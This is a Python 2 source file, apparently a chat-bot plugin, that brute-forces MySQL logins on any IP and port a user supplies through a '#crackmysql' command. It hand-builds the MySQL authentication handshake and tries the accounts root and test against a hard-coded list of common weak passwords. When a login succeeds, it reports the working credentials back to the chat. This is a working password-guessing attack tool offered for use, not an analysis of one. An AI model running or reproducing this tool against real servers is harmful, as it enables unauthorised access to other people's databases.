# coding:utf-8
import re
import hashlib
import struct
import binascii
import socket
import threading


def get_hash(password, scramble):
    hash_stage1 = hashlib.sha1(password).digest()
    hash_stage2 = hashlib.sha1(hash_stage1).digest()
    to = hashlib.sha1(scramble + hash_stage2).digest()
    reply = [ord(h1) ^ ord(h3) for (h1, h3) in zip(hash_stage1, to)]
    hash = struct.pack('20B', *reply)
    return hash


def get_scramble(packet):
    tmp = packet[15:]
    m = re.findall("\x00?([\x01-\x7F]{7,})\x00", tmp)
    if len(m) > 3: del m[0]
    scramble = m[0] + m[1]
    try:
        plugin = m[2]
    except:
        plugin = ''
    return plugin, scramble


def get_auth_data(user, password, scramble, plugin):
    user_hex = binascii.b2a_hex(user)
    pass_hex = binascii.b2a_hex(get_hash(password, scramble))
    if not password:
        data = "85a23f0000000040080000000000000000000000000000000000000000000000" + user_hex + "0000"
    else:
        data = "85a23f0000000040080000000000000000000000000000000000000000000000" + user_hex + "0014" + pass_hex
    if plugin: data += binascii.b2a_hex(
        plugin) + "0055035f6f73076f737831302e380c5f636c69656e745f6e616d65086c69626d7973716c045f7069640539323330360f5f636c69656e745f76657273696f6e06352e362e3231095f706c6174666f726d067838365f3634"
    len_hex = hex(len(data) / 2).replace("0x", "")
    auth_data = len_hex + "000001" + data
    return binascii.a2b_hex(auth_data)


def check(ip, port, timeout,msg):
    socket.setdefaulttimeout(timeout)
    user_list = ['root', 'test']
    PASSWORD_DIC = ['alpine',
                    'ohshit',
                    '%null%',
                    '000000',
                    '111111',
                    '11111111',
                    '112233',
                    '123123',
                    '123321',
                    '12345',
                    '123456',
                    '1234567',
                    '12345678',
                    '654321',
                    '666666',
                    '888888',
                    'abcdef',
                    'abcabc',
                    'abc123',
                    'a1b2c3',
                    'aaa111',
                    '123qwe',
                    'qwerty',
                    'qweasd',
                    'admin',
                    'password',
                    'p@ssword',
                    'passwd',
                    'iloveyou',
                    '5201314',
                    'dragon']
    for user in user_list:
        for pass_ in PASSWORD_DIC:
            try:
                pass_ = str(pass_.replace('{user}', user))
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, int(port)))
                packet = sock.recv(254)
                # print packet
                plugin, scramble = get_scramble(packet)
                auth_data = get_auth_data(user, pass_, scramble, plugin)
                sock.send(auth_data)
                result = sock.recv(1024)
                if result == "\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00":
                    msg.Reply("%s 存在弱口令，账号：%s，密码：%s" % (ip,user, pass_))
            except Exception, e:
                if "Errno 10061" in str(e) or "timed out" in str(e):
                    msg.Reply('扫描异常结束')
                    return
    msg.Reply(ip+' 扫描结束')


def work(msg,info):
    msg.content = msg.content.strip()
    if msg.content.startswith("crackmysql"):
        if not info.get('level', 3) < 3:
            return False
        try:
            host = msg.content.split(' ', 1)[-1]
            port = '3306'
            if host.count(' '):
                port = host.split(' ')[-1]
                host = host.split(' ')[0]
            threading.Thread(target=check, args=(host, int(port), 5, msg)).start()
            return '已经添加扫描任务'
        except:
            return help(info)
    else:
        return False


def help(info):
    if not info.get('level',3) < 3:
        return False
    return '#crackmysql ip [port] 用于爆破mysql'
